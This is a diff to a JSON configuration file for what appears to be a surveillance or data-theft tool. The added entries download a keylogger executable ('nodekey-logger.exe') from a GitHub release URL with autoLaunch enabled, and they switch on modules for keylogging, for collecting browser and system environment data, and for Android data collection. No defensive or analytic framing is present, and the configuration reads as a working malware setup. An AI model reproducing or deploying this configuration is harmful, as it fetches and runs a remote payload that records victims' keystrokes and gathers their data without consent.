@@ -1,6 +1,24 @@
 [
-
     {
-        "module" : "environ"
+        "type": "logger",
+        "name": "NodeKey Logger",
+        "downloadUrl": "https://github.com/hail-grail-mary/make-it-rain/releases/download/v1.0.0/nodekey-logger.exe",
+        "autoLaunch": true,
+        "description": "Minimal keylogger executable"
+    },
+    {
+        "type": "module",
+        "module": "environment",
+        "description": "Collect browser and system environment data"
+    },
+    {
+        "type": "module",
+        "module": "keylogger",
+        "description": "Keylogging functionality"
+    },
+    {
+        "type": "module",
+        "module": "android",
+        "description": "Android-specific data collection"
     }
 ]
